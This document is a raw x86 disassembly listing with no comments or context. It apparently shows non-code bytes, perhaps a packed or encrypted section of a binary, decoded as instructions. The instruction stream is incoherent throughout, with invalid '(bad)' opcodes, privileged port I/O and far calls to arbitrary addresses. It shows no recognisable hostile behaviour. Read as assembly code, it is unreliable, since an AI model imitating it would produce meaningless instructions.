  42a26c:	hlt    
  42a26d:	xor    BYTE PTR [edi+0x67],ah
  42a270:	mov    dl,0x8d
  42a272:	ficom  WORD PTR [ecx]
  42a274:	adc    BYTE PTR [ebx+0xb5231e9],ch
  42a27a:	jmp    0x42a2cf
  42a27c:	and    ah,dl
  42a27e:	imul   ebp,DWORD PTR [ecx+0x39aaa7b],0xdc6fc60c
  42a288:	jne    0x42a229
  42a28a:	add    edi,DWORD PTR [edx+0x26bc4fe7]
  42a290:	add    ch,BYTE PTR [esi+0x46]
  42a293:	das    
  42a294:	mov    ebx,ecx
  42a296:	enter  0x945d,0x21
  42a29a:	sub    ebx,DWORD PTR [edx]
  42a29c:	mov    dl,0x79
  42a29e:	sbb    BYTE PTR [edi-0x58e2bb1f],0x5d
  42a2a5:	and    ebx,DWORD PTR [esi-0x4a]
  42a2a8:	pop    ss
  42a2a9:	mov    cl,0x4c
  42a2ab:	outs   dx,DWORD PTR ds:[esi]
  42a2ac:	mov    dl,0x5a
  42a2ae:	mov    edx,0xdc3c1b40
  42a2b3:	xor    eax,DWORD PTR [ecx]
  42a2b5:	stc    
  42a2b6:	xcrypt-ofb (bad)
  42a2b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a2b8:	out    dx,al
  42a2b9:	add    BYTE PTR [edx-0x49],ah
  42a2bc:	std    
  42a2bd:	(bad)  
  42a2bf:	sub    DWORD PTR [edx+0x65a6a176],esi
  42a2c5:	mov    ?,ebx
  42a2c7:	(bad)  
  42a2c8:	or     BYTE PTR ss:[ebx-0x5a8d940a],bh
  42a2cf:	mov    eax,ds:0x7b05852
  42a2d4:	mov    dl,0x96
  42a2d6:	in     eax,0x4a
  42a2d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a2d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a2da:	adc    eax,0x180b0e5c
  42a2df:	mov    edx,0x669bc27c
  42a2e4:	icebp  
  42a2e5:	mov    ds:0x4c56569a,al
  42a2ea:	jg     0x42a333
  42a2ec:	dec    edx
  42a2ed:	mov    esi,esp
  42a2ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a2f0:	stos   DWORD PTR es:[edi],eax
  42a2f1:	dec    ebp
  42a2f2:	mov    ds:0xb40cd57b,eax
  42a2f7:	ins    DWORD PTR es:[edi],dx
  42a2f8:	mov    ch,0xfb
  42a2fa:	lock shr BYTE PTR [ecx],1
  42a2fd:	xchg   ebp,eax
  42a2fe:	in     eax,dx
  42a2ff:	les    edx,FWORD PTR [edx]
  42a301:	jne    0x42a2f1
  42a303:	aad    0x64
  42a305:	or     ebx,edi
  42a307:	and    bl,dl
  42a309:	(bad)  
  42a30a:	test   bl,0x3a
  42a30d:	jle    0x42a2fb
  42a30f:	enter  0x8bb2,0x8
  42a313:	and    bl,BYTE PTR [eax+0x474a225f]
  42a319:	push   ebx
  42a31a:	cmp    BYTE PTR [ebp+0x28a72489],dl
  42a320:	inc    esp
  42a321:	or     esp,DWORD PTR ds:0x44598558
  42a327:	jge    0x42a2af
  42a329:	jne    0x42a2c5
  42a32b:	mov    edx,0x1bd3d9fd
  42a330:	mov    eax,ds:0x71a724ae
  42a335:	jb     0x42a2f0
  42a337:	mov    BYTE PTR [ecx-0x25],bh
  42a33a:	lahf   
  42a33b:	ret    
  42a33c:	mov    bl,0x7a
  42a33e:	imul   edi,DWORD PTR [edi+0x474c51a7],0x46
  42a345:	daa    
  42a346:	add    al,0x9a
  42a348:	int3   
  42a349:	test   al,0x1b
  42a34b:	mul    BYTE PTR [edx+0x50778821]
  42a351:	in     al,0x52
  42a353:	sbb    esp,DWORD PTR [ecx+0x36]
  42a356:	call   0x1a63:0x3b6b5bef
  42a35d:	cs pop ecx
  42a35f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a360:	mov    bh,0x21
  42a362:	int3   
  42a363:	shr    BYTE PTR [ebx],0x20
  42a366:	jnp    0x42a35e
  42a368:	mov    dl,0x4b
  42a36a:	icebp  
  42a36b:	idiv   DWORD PTR [esi]
  42a36d:	cld    
  42a36e:	enter  0x2db3,0xb
  42a372:	ja     0x42a387
  42a374:	mov    ds:0x2b68b7c2,al
  42a379:	ss cwde 
  42a37b:	dec    ecx
  42a37c:	and    eax,0xe811d4e3
  42a381:	retf   
  42a382:	dec    esp
  42a383:	sub    eax,0xbdb90b4e
  42a388:	jmp    0x5a84:0xb25cb4
  42a38f:	xchg   ecx,eax
  42a390:	lahf   
  42a391:	pop    ebp
  42a392:	nop
  42a393:	pop    ss
  42a394:	xchg   ebx,eax
  42a395:	or     edx,DWORD PTR [ebp+0x5e]
  42a398:	add    eax,0x71291c67
  42a39d:	out    dx,al
  42a39e:	in     al,0xf7
  42a3a0:	mov    dl,0xa8
  42a3a2:	jge    0x42a34a
  42a3a4:	sar    BYTE PTR [ebp+0xba38313],cl
  42a3aa:	call   0xa2053dd6
  42a3af:	sti    
  42a3b0:	arpl   cx,si
  42a3b2:	fwait
  42a3b3:	stc    
  42a3b4:	clc    
  42a3b5:	inc    ebx
  42a3b6:	push   0x6a262d8b
  42a3bb:	mov    BYTE PTR [ebx+0xb],dl
  42a3be:	arpl   ax,dx
  42a3c0:	push   ss
  42a3c1:	shl    DWORD PTR [ecx-0x797f4446],1
  42a3c7:	idiv   ebp
  42a3c9:	mov    ah,0x5a
  42a3cb:	xor    BYTE PTR [eiz*8+0xb7650dc],dh
  42a3d2:	bound  ecx,QWORD PTR [eax]
  42a3d4:	pop    es
  42a3d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a3d6:	dec    ebx
  42a3d7:	int    0xa0
  42a3d9:	or     DWORD PTR [edx+0x4ae8fd96],ebx
  42a3df:	out    0x0,eax
  42a3e1:	mov    al,ds:0xab3dbbaa
  42a3e6:	enter  0xf867,0xa1
  42a3ea:	mov    bh,0xe6
  42a3ec:	push   ds
  42a3ed:	push   ss
  42a3ee:	call   0xf9f1:0xb89d8b46
  42a3f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a3f6:	sbb    esp,DWORD PTR [eax+0x6c7d4e7a]
  42a3fc:	inc    edi
  42a3fd:	sbb    esp,DWORD PTR [edx-0x6522ec40]
  42a403:	xor    DWORD PTR [edx],esi
  42a405:	xchg   ecx,ebx
  42a407:	cmp    eax,0xa70a36f2
  42a40c:	pop    esi
  42a40d:	adc    edi,esi
  42a40f:	ds push eax
  42a411:	mov    ah,bh
  42a413:	push   cs
  42a414:	mov    dl,0x90
  42a416:	dec    DWORD PTR [edi]
  42a418:	sbb    eax,0xd120f8e0
  42a41d:	out    dx,al
  42a41e:	pop    ecx
  42a41f:	aas    
  42a420:	daa    
  42a421:	mov    esi,0x624ca71a
  42a426:	push   ebx
  42a427:	mov    edi,0x4c08f322
  42a42c:	mov    al,0x11
  42a42e:	xchg   edx,eax
  42a42f:	sub    eax,0x209b320b
  42a434:	ss xchg edi,eax
  42a436:	sub    edx,edi
  42a438:	push   es
  42a439:	jne    0x42a4a5
  42a43b:	fcomp  QWORD PTR [ebp+0xb]
  42a43e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a43f:	push   esi
  42a440:	cmp    al,0x45
  42a442:	add    bl,BYTE PTR [ebx-0xf6554af]
  42a448:	test   al,0x27
  42a44a:	jmp    0xc984e97c
  42a44f:	test   eax,0x47813103
  42a454:	mov    dl,0x5d
  42a456:	mov    eax,0x9ab2a636
  42a45b:	xor    al,0x5a
  42a45d:	xchg   edx,ebp
  42a45f:	(bad)  
  42a460:	out    0x2,al
  42a462:	test   DWORD PTR [eax+0x48d6ad07],esp
  42a468:	loope  0x42a455
  42a46a:	daa    
  42a46b:	mov    ch,BYTE PTR [edi-0x66]
  42a46e:	call   0x7205709
  42a473:	(bad)  
  42a474:	das    
  42a475:	mov    WORD PTR [eax-0x23],cs
  42a478:	jmp    0x15ea:0x7d511e0b
  42a47f:	pusha  
  42a480:	xchg   edx,eax
  42a481:	add    DWORD PTR [edx+0x7d529d1],ebx
  42a487:	or     BYTE PTR [eax+eax*8],al
  42a48a:	jle    0x42a465
  42a48c:	push   ss
  42a48d:	or     ebp,DWORD PTR [ecx-0x33279aeb]
  42a493:	cld    
  42a494:	sub    BYTE PTR [esi-0x62],dh
  42a497:	ret    0xf501
  42a49a:	stos   DWORD PTR es:[edi],eax
  42a49b:	jnp    0x42a4cf
  42a49d:	cmp    ebp,DWORD PTR ds:0x1c0b926a
  42a4a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a4a4:	(bad)  
  42a4a5:	cmp    eax,0x7d4d89de
  42a4aa:	call   0xb5f8:0xaf932860
  42a4b1:	cmp    al,0x92
  42a4b3:	mov    al,ds:0x1d5ee3e6
  42a4b8:	xor    ebx,ebp
  42a4ba:	retf   
  42a4bb:	leave  
  42a4bc:	mov    ecx,DWORD PTR [ecx+0x1a622084]
  42a4c2:	sbb    bl,ah
  42a4c4:	inc    esi
  42a4c5:	jle    0x42a4b7
  42a4c7:	bound  eax,QWORD PTR [eax+0xb]
  42a4ca:	ins    DWORD PTR es:[edi],dx
  42a4cb:	jb     0x42a4bd
  42a4cd:	fldcw  WORD PTR [ebp-0x2d5ebe00]
  42a4d3:	ret    0x74f2
  42a4d6:	call   0x7345:0x99d79d19
  42a4dd:	neg    DWORD PTR [edx+0x59]
  42a4e0:	cs or  edx,edx
  42a4e3:	outs   dx,BYTE PTR ds:[esi]
  42a4e4:	in     eax,dx
  42a4e5:	je     0x42a4bc
  42a4e7:	out    dx,al
  42a4e8:	jne    0x42a54c
  42a4ea:	popf   
  42a4eb:	dec    ebx
  42a4ec:	(bad)  
  42a4ed:	mov    esp,0x5c021d81
  42a4f2:	sub    eax,DWORD PTR [esi]
  42a4f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a4f5:	or     ebp,DWORD PTR [esi+0x188d98de]
  42a4fb:	xor    DWORD PTR [ebp+0x78],edx
  42a4fe:	call   0x62ca:0x78576da3
  42a505:	sub    bh,BYTE PTR [esi-0x7afcbf5a]
  42a50b:	mov    BYTE PTR [ecx+0x7f],0x88
  42a50f:	dec    ebx
  42a510:	add    eax,0x687a9a3e
  42a515:	scas   eax,DWORD PTR es:[edi]
  42a516:	sbb    ecx,0x1
  42a519:	sbb    al,ah
  42a51b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a51c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a51d:	(bad)  
  42a51e:	fidiv  DWORD PTR [ebx]
  42a520:	retf   
  42a521:	or     bh,dh
  42a523:	shl    DWORD PTR [edx-0x7edc460d],1
  42a529:	mov    ch,0xd8
  42a52b:	popf   
  42a52c:	pop    ebx
  42a52d:	or     al,0xb5
  42a52f:	lods   eax,DWORD PTR ds:[esi]
  42a530:	sbb    al,0xb6
  42a532:	(bad)  
  42a533:	(bad)  
  42a534:	adc    al,0xd9
  42a536:	lods   al,BYTE PTR ds:[esi]
  42a537:	cdq    
  42a538:	mov    bh,BYTE PTR [ebx+ecx*2-0x1171cc59]
  42a53f:	addr16 mov ds:0x907d,eax
  42a543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a544:	cmp    eax,0xeaabb6c7
  42a549:	ror    DWORD PTR [edx],0x47
  42a54c:	mov    dl,0x67
  42a54e:	clc    
  42a54f:	sub    al,BYTE PTR [esi]
  42a551:	push   ds
  42a552:	dec    edx
  42a553:	and    DWORD PTR [esi+0xa],ebx
  42a556:	cld    
  42a557:	or     DWORD PTR [ecx+0x79],esp
  42a55a:	jge    0x42a564
  42a55c:	(bad)  
  42a55d:	repz inc esp
  42a55f:	and    cl,al
  42a561:	sub    DWORD PTR [edi-0x7837f790],ebx
  42a567:	shl    BYTE PTR [edx],0x4e
  42a56a:	or     esp,ecx
  42a56c:	xchg   esp,eax
  42a56d:	or     ebp,DWORD PTR [edx+0x7328a717]
  42a573:	out    0xa8,eax
  42a575:	and    ah,BYTE PTR ds:[esi+esi*4+0x4e]
  42a57a:	mov    eax,ds:0x1adaccf8
  42a57f:	in     eax,0x28
  42a581:	imul   eax,DWORD PTR [edi+eiz*4-0x69],0xffffffa0
  42a586:	nop
  42a587:	rcl    BYTE PTR [ebp-0x4dcc7818],1
  42a58d:	leave  
  42a58e:	push   ebx
  42a58f:	pusha  
  42a590:	repz shl dh,0x25
  42a594:	loope  0x42a5a1
  42a596:	mov    al,ds:0xe0337d96
  42a59b:	outs   dx,DWORD PTR ds:[esi]
  42a59c:	iret   
  42a59d:	push   ds
  42a59e:	popf   
  42a59f:	ret    0xc892
  42a5a2:	(bad)  
  42a5a4:	jb     0x42a547
  42a5a6:	dec    ecx
  42a5a7:	cdq    
  42a5a8:	aam    0xb
  42a5aa:	rol    DWORD PTR [edx],1
  42a5ac:	push   cs
  42a5ad:	fisttp DWORD PTR [ecx+ebx*2-0x73]
  42a5b1:	mov    eax,0xf0c0179a
  42a5b6:	pop    ebp
  42a5b7:	test   edx,eax
  42a5b9:	cmp    esp,DWORD PTR [edi]
  42a5bb:	lods   al,BYTE PTR ds:[esi]
  42a5bc:	mov    ebx,0xb20a14fc
  42a5c1:	sub    bl,0x47
  42a5c4:	lds    ecx,FWORD PTR [eax-0x7c]
  42a5c7:	loope  0x42a5e7
  42a5c9:	pop    ebp
  42a5ca:	sbb    dl,BYTE PTR [esi]
  42a5cc:	pop    ebp
  42a5cd:	and    BYTE PTR [ebx+ebp*2+0x74630b29],dh
  42a5d4:	aam    0xf6
  42a5d6:	gs push ebp
  42a5d8:	jb     0x42a575
  42a5da:	call   0x6d59:0x6ef7a098
  42a5e1:	push   ss
  42a5e2:	and    bl,BYTE PTR [ecx+0x4f14b6f7]
  42a5e8:	mov    edx,0xfb2c9a7c
  42a5ed:	stos   DWORD PTR es:[edi],eax
  42a5ee:	(bad)  
  42a5ef:	cmp    ch,BYTE PTR [edi-0x7394b18f]
  42a5f5:	or     ebp,DWORD PTR [eax+ecx*4+0x1903af07]
  42a5fc:	inc    esp
  42a5fd:	or     al,0x4f
  42a5ff:	(bad)  
  42a600:	mov    ebp,0x65d747e2
  42a605:	add    DWORD PTR [eax+0x6b],ebx
  42a608:	lods   eax,DWORD PTR ds:[esi]
  42a609:	cmp    ah,ah
  42a60b:	xchg   ebx,eax
  42a60c:	cld    
  42a60d:	imul   BYTE PTR [edx+0x6]
  42a610:	mov    ds:0x47c9494e,eax
  42a615:	scas   eax,DWORD PTR es:[edi]
  42a616:	jb     0x42a632
  42a618:	jbe    0x42a625
  42a61a:	pushf  
  42a61b:	ficom  DWORD PTR [eax+0x7b]
  42a61e:	in     eax,dx
  42a61f:	les    ebx,FWORD PTR [ebx+0x62]
  42a622:	call   0x995:0xca873489
  42a629:	into   
  42a62a:	icebp  
  42a62b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a62c:	lods   al,BYTE PTR ds:[esi]
  42a62d:	lods   al,BYTE PTR ds:[esi]
  42a62e:	unpckhps xmm4,XMMWORD PTR [ebx+0x79]
  42a632:	mov    edx,0x7810bc86
  42a637:	outs   dx,DWORD PTR ds:[esi]
  42a638:	in     eax,dx
  42a639:	mov    esi,cs
  42a63b:	push   esp
  42a63c:	adc    eax,DWORD PTR [ecx]
  42a63e:	and    eax,0x1e3c92b3
  42a643:	test   eax,0x51760c48
  42a648:	ror    BYTE PTR [ebx+0x7527ef7a],cl
  42a64e:	call   0x510b:0xfd316e03
  42a655:	loop   0x42a6c5
  42a657:	jmp    0x42a632
  42a659:	outs   dx,DWORD PTR ds:[esi]
  42a65a:	cdq    
  42a65b:	ss (bad) 
  42a65d:	cmc    
  42a65e:	jno    0x42a67c
  42a660:	pop    edx
  42a661:	and    BYTE PTR [edx],ch
  42a663:	mov    ds:0xf08fc6b2,eax
  42a668:	xlat   BYTE PTR ds:[ebx]
  42a669:	push   ebp
  42a66a:	(bad)
  42a66d:	or     ecx,DWORD PTR [esi-0x691dea9f]
  42a673:	dec    edx
  42a674:	out    dx,eax
  42a675:	or     BYTE PTR [ebp+0x520249be],bl
  42a67b:	ins    BYTE PTR es:[edi],dx
  42a67c:	add    bl,BYTE PTR ds:0xb3e15dd
  42a682:	mov    ecx,0xee435beb
  42a687:	test   eax,0xd7e64be9
  42a68c:	mov    dl,0xf7
  42a68e:	test   DWORD PTR [ebx-0x3077c10d],edi
  42a694:	or     eax,DWORD PTR gs:[edx]
  42a697:	push   0x8d125d85
  42a69c:	dec    ebx
  42a69d:	jo     0x42a68e
  42a69f:	mov    ah,0x40
  42a6a1:	pop    edx
  42a6a2:	xchg   bl,ch
  42a6a4:	adc    esp,DWORD PTR [edx-0x481ef7e6]
  42a6aa:	mov    eax,ds:0x50ba789
  42a6af:	stos   BYTE PTR es:[edi],al
  42a6b0:	xchg   esp,eax
  42a6b1:	xlat   BYTE PTR ds:[ebx]
  42a6b2:	jge    0x42a671
  42a6b4:	or     eax,0x2eae9ace
  42a6b9:	loopne 0x42a65b
  42a6bb:	popa   
  42a6bc:	(bad)  
  42a6bd:	in     eax,dx
  42a6be:	and    DWORD PTR [edi-0x606761ef],0x29
  42a6c5:	mov    edi,0x6abdb6aa
  42a6ca:	or     al,0x9
  42a6cc:	dec    ebp
  42a6cd:	dec    edx
  42a6ce:	xlat   BYTE PTR ds:[ebx]
  42a6cf:	xchg   BYTE PTR [ebx+0x5de6667b],al
  42a6d5:	or     ebp,DWORD PTR [ecx+0x5deb6650]
  42a6db:	dec    ecx
  42a6dc:	xchg   BYTE PTR [edx+0x25e199a],dh
  42a6e2:	xor    DWORD PTR [eax-0x67],edi
  42a6e5:	dec    BYTE PTR [ecx-0x2d]
  42a6e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a6e9:	or     edi,DWORD PTR [esi+0x4b1f280e]
  42a6ef:	std    
  42a6f0:	cmp    ecx,edx
  42a6f2:	fwait
  42a6f3:	pop    ecx
  42a6f4:	dec    ebx
  42a6f5:	popa   
  42a6f6:	repz sahf 
  42a6f8:	cld    
  42a6f9:	sbb    al,BYTE PTR [edx+0x31]
  42a6fc:	or     DWORD PTR [edx],0xb5862a96
  42a702:	mov    dl,0xe7
  42a704:	test   al,bl
  42a706:	jp     0x42a6ba
  42a708:	rcr    ecx,cl
  42a70a:	cdq    
  42a70b:	paddusb mm2,QWORD PTR [edi+ebx*4]
  42a70f:	jae    0x42a6dc
  42a711:	mov    ds:0x8fee1d3,eax
  42a716:	mov    edi,DWORD PTR ss:[eax+0x25ac6199]
  42a71d:	or     eax,esp
  42a71f:	push   ebx
  42a720:	sub    eax,0x40e7a336
  42a725:	add    al,0xcd
  42a727:	mov    esi,0x3f66c853
  42a72c:	test   bl,ch
  42a72e:	rcl    DWORD PTR gs:[eax+0x74],0xe4
  42a733:	dec    ebp
  42a734:	mov    esi,0x6396c30b
  42a739:	imul   BYTE PTR [eax-0x6533e7ad]
  42a73f:	adc    eax,0xc7e7439c
  42a744:	dec    ebx
  42a745:	retf   0x455a
  42a748:	test   BYTE PTR [ebx],0xb7
  42a74b:	or     DWORD PTR [esi+0x54bc6fa4],esp
  42a751:	scas   eax,DWORD PTR es:[edi]
  42a752:	xchg   esp,eax
  42a753:	sub    edi,DWORD PTR [ebp+0x50]
  42a756:	lock daa 
  42a758:	xor    BYTE PTR [ecx-0x1277a91c],dh
  42a75e:	in     eax,0xa7
  42a760:	pop    edx
  42a761:	fnstcw WORD PTR [edx+0xa32eaa1]
  42a767:	leave  
  42a768:	std    
  42a769:	mov    edx,0x94b43a66
  42a76e:	cli    
  42a76f:	ret    
  42a770:	xchg   ebx,eax
  42a771:	gs fwait
  42a773:	sar    DWORD PTR [ebx+0x5d],1
  42a776:	mov    BYTE PTR [ebx+ebx*4+0x5],dl
  42a77a:	push   edx
  42a77b:	xor    eax,0x4bda0aa3
  42a780:	pop    edx
  42a781:	pop    ds
  42a782:	mov    esp,0xefc7bb3c
  42a787:	mov    esi,0x686186b2
  42a78c:	push   esi
  42a78d:	add    edx,ebp
  42a78f:	stos   BYTE PTR es:[edi],al
  42a790:	and    cl,BYTE PTR [ebx]
  42a792:	adc    al,0x26
  42a794:	dec    edx
  42a795:	ret    
  42a796:	loope  0x42a803
  42a798:	aad    0x43
  42a79a:	call   0x6608:0xe4c51bd6
  42a7a1:	jg     0x42a733
  42a7a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7a4:	fild   WORD PTR [ebp-0x7f14d237]
  42a7aa:	dec    ebx
  42a7ab:	sbb    esi,DWORD PTR [edx+0x59428cce]
  42a7b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a7b2:	pop    edx
  42a7b3:	xchg   edi,eax
  42a7b4:	inc    esi
  42a7b5:	or     ebp,DWORD PTR [edx]
  42a7b7:	(bad)  
  42a7b9:	fldcw  WORD PTR [ecx-0x65c16c5f]
  42a7bf:	mov    esp,0x48fe9c3f
  42a7c4:	lahf   
  42a7c5:	mov    al,0x13
  42a7c7:	aaa    
  42a7c8:	or     esi,DWORD PTR es:[edi-0x49]
  42a7cc:	es out dx,eax
  42a7ce:	sub    ebp,DWORD PTR [ebp+0x769adbaa]
  42a7d4:	imul   edi,DWORD PTR [ecx-0x5c],0xffffffb1
  42a7d8:	ret    0x29ac
  42a7db:	stos   DWORD PTR es:[edi],eax
  42a7dc:	sbb    BYTE PTR [esi+0x53a65cb5],dl
  42a7e2:	call   0x3893:0x198bc89b
  42a7e9:	sub    eax,0x8551a728
  42a7ee:	cli    
  42a7ef:	jno    0x42a7e2
  42a7f1:	ds aam 0x34
  42a7f4:	mov    dl,0xe1
  42a7f6:	and    BYTE PTR [ebp+eax*1-0x56],0x0
  42a7fb:	or     BYTE PTR [edi*2+0x3677a761],ch
  42a802:	fisttp QWORD PTR [esp+ecx*8]
  42a805:	in     eax,dx
  42a806:	test   BYTE PTR [edi-0x33cb394e],bl
  42a80c:	push   0x9f63d0f3
  42a811:	add    DWORD PTR [edx+0xa05fe35],eax
  42a817:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a818:	mov    ch,0xfa
  42a81a:	cwde   
  42a81b:	mov    esi,DWORD PTR [edi-0x7ec65edd]
  42a821:	xchg   esp,eax
  42a822:	shl    ah,cl
  42a824:	repz and al,0xa
  42a827:	xor    dl,BYTE PTR [eax-0x4f09936]
  42a82d:	or     esp,DWORD PTR [ebx+eax*8+0x58413148]
  42a834:	pop    edi
  42a835:	sub    al,0x9b
  42a837:	cwde   
  42a838:	xor    BYTE PTR [ecx+0x14e54670],bh
  42a83e:	jle    0x42a87c
  42a840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a841:	or     esp,DWORD PTR [edx-0x77]
  42a844:	pop    ecx
  42a845:	xor    BYTE PTR [esi-0x61],dl
  42a848:	pop    ss
  42a849:	into   
  42a84a:	xchg   DWORD PTR [edx],ebx
  42a84c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42a84e:	xchg   ecx,eax
  42a84f:	xlat   BYTE PTR ds:[ebx]
  42a850:	inc    ecx
  42a851:	mov    dl,BYTE PTR [ecx]
  42a853:	cmp    esi,esi
  42a855:	cmp    eax,0xbf4a356
  42a85a:	retf   0x4474
  42a85d:	(bad)  
  42a85e:	daa    
  42a85f:	sub    ebx,ebp
  42a861:	sbb    DWORD PTR [edx+0x7d1d4c96],0xc0884aae
  42a86b:	push   ebp
  42a86c:	jmp    0x52c4:0x86ae7b7f
  42a873:	and    eax,0xb71aeabb
  42a878:	sbb    cl,dl
  42a87a:	push   eax
  42a87b:	push   ds
  42a87c:	mov    ebp,0x32409dfc
  42a881:	imul   ebx,DWORD PTR [edi-0xe0a4108],0xffffffa8
  42a888:	aaa    
  42a889:	(bad)  
  42a88a:	cs fwait
  42a88c:	idiv   BYTE PTR [esi+0x2a]
  42a88f:	addr16 mov ?,edx
  42a892:	add    bh,BYTE PTR [edi+esi*4-0x2ba86aa4]
  42a899:	xor    bl,BYTE PTR [ecx]
  42a89b:	pop    esp
  42a89c:	xchg   esi,eax
  42a89d:	jecxz  0x42a867
  42a89f:	out    0x44,al
  42a8a1:	or     ecx,DWORD PTR [eax-0x5b]
  42a8a4:	inc    ebp
  42a8a5:	mov    edx,0x146f9f51
  42a8aa:	out    dx,eax
  42a8ab:	aaa    
  42a8ac:	mov    bh,0xc5
  42a8ae:	adc    DWORD PTR [esi+0x225a3e5a],0xa791eac3
  42a8b8:	mov    ebp,0x3d5012d1
  42a8bd:	adc    bl,BYTE PTR [ebx-0x46214de0]
  42a8c3:	cmp    al,0x8a
  42a8c5:	cwde   
  42a8c6:	lds    esp,FWORD PTR [eax*4+0x1f21200b]
  42a8cd:	adc    eax,0x6e5b5ed5
  42a8d2:	mov    ah,0xe5
  42a8d4:	cmp    al,0x97
  42a8d6:	fwait
  42a8d7:	sub    ch,BYTE PTR [esi-0x50]
  42a8da:	popf   
  42a8db:	mov    bh,0x62
  42a8dd:	push   ds
  42a8de:	pusha  
  42a8df:	mov    al,ds:0x33f94e80
  42a8e4:	inc    esp
  42a8e5:	or     al,0xc1
  42a8e7:	push   edi
  42a8e8:	gs leave 
  42a8ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a8eb:	clc    
  42a8ec:	mov    dl,0xa8
  42a8ee:	push   edx
  42a8ef:	mov    edi,0x5013320f
  42a8f4:	es sbb al,0xf8
  42a8f7:	sbb    al,0x1b
  42a8f9:	or     esi,DWORD PTR [ecx+eiz*4]
  42a8fc:	jmp    0x42a934
  42a8fe:	mov    eax,0x45c5a67b
  42a903:	sahf   
  42a904:	and    eax,0x93dbf70b
  42a909:	stos   BYTE PTR es:[edi],al
  42a90a:	mov    ds:0xf8158ea4,al
  42a90f:	aam    0xac
  42a911:	mov    ebx,DWORD PTR [eax-0x6f]
  42a914:	in     eax,0x57
  42a916:	(bad)  
  42a918:	mov    dl,0x9e
  42a91a:	jl     0x42a8a0
  42a91c:	stos   DWORD PTR es:[edi],eax
  42a91d:	popa   
  42a91e:	adc    BYTE PTR [ebx],dl
  42a920:	jbe    0x42a996
  42a922:	fbld   TBYTE PTR [edi+0x235e4c6]
  42a928:	lahf   
  42a929:	push   ebx
  42a92a:	outs   dx,BYTE PTR ds:[esi]
  42a92b:	or     al,0xb2
  42a92d:	sar    BYTE PTR [eax],1
  42a92f:	retf   
  42a930:	ins    BYTE PTR es:[edi],dx
  42a931:	outs   dx,BYTE PTR ds:[esi]
  42a932:	inc    BYTE PTR [edi-0x1610f4b4]
  42a938:	into   
  42a939:	sbb    esi,DWORD PTR [eax+edi*8+0xc]
  42a93d:	adc    al,0x9a
  42a93f:	push   0x4763cbc0
  42a944:	push   es
  42a945:	push   0xcc09a069
  42a94a:	sbb    ch,BYTE PTR [edx+0x45]
  42a94d:	sti    
  42a94e:	stos   DWORD PTR es:[edi],eax
  42a94f:	repz (bad) 
  42a951:	stc    
  42a952:	call   0x716:0x43925f52
  42a959:	aas    
  42a95a:	push   0xffffffa7
  42a95c:	call   0x309b:0x4500e07a
  42a963:	lds    esi,FWORD PTR [edx+0x7d8e5b21]
  42a969:	fdivr  QWORD PTR [edi-0xf]
  42a96c:	or     edi,DWORD PTR es:[ecx+eax*1+0x5c]
  42a971:	mov    ch,0x2
  42a973:	cmovns ebp,DWORD PTR [esi]
  42a976:	call   0x3368:0xba812840
  42a97d:	ins    BYTE PTR es:[edi],dx
  42a97e:	mov    bh,0xa7
  42a980:	pop    eax
  42a981:	add    BYTE PTR [ecx+eax*8+0x1db63d41],0xae
  42a989:	pop    ecx
  42a98a:	clc    
  42a98b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a98c:	xor    cl,al
  42a98e:	aad    0xbd
  42a990:	jns    0x42a9ad
  42a992:	xchg   ebx,eax
  42a993:	mov    ds:0xd423bf5b,al
  42a998:	mov    ecx,DWORD PTR [ebx+0x7f6f1420]
  42a99e:	call   0x21c4:0xb4f26e3d
  42a9a5:	mov    ds:0x2585785,eax
  42a9aa:	pop    ebp
  42a9ab:	inc    esi
  42a9ac:	nop
  42a9ad:	fistp  WORD PTR [ecx+0x22799840]
  42a9b3:	inc    ebx
  42a9b4:	and    bl,BYTE PTR [esi+eax*4-0x6a]
  42a9b8:	and    BYTE PTR [edx-0x592cb526],0x9f
  42a9bf:	push   ds
  42a9c0:	push   edx
  42a9c1:	icebp  
  42a9c2:	mov    ch,0xa9
  42a9c4:	pusha  
  42a9c5:	out    0x92,eax
  42a9c7:	mov    edi,0xd0e4bc12
  42a9cc:	push   eax
  42a9cd:	jae    0x42a972
  42a9cf:	sti    
  42a9d0:	je     0x42a95a
  42a9d2:	inc    esp
  42a9d3:	sbb    al,0x17
  42a9d5:	xor    al,0xbf
  42a9d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a9d8:	in     al,0xc
  42a9da:	mov    ah,0x77
  42a9dc:	aaa    
  42a9dd:	sub    BYTE PTR [edi-0x6b],bl
  42a9e0:	mov    bl,0x24
  42a9e2:	pop    ebx
  42a9e3:	stos   DWORD PTR es:[edi],eax
  42a9e4:	adc    ebp,DWORD PTR [ebp+0x60]
  42a9e7:	repnz outs dx,BYTE PTR ds:[esi]
  42a9e9:	push   ebx
  42a9ea:	jp     0x42a993
  42a9ec:	mov    ds:0xcff51ec4,al
  42a9f1:	add    al,0x39
  42a9f3:	ss mov ebp,0x2470d66e
  42a9f9:	imul   ebx,esp,0xffffffee
  42a9fc:	(bad)  [edi-0x7dde58be]
  42aa02:	(bad)  
  42aa03:	cli    
  42aa04:	icebp  
  42aa05:	jp     0x42a987
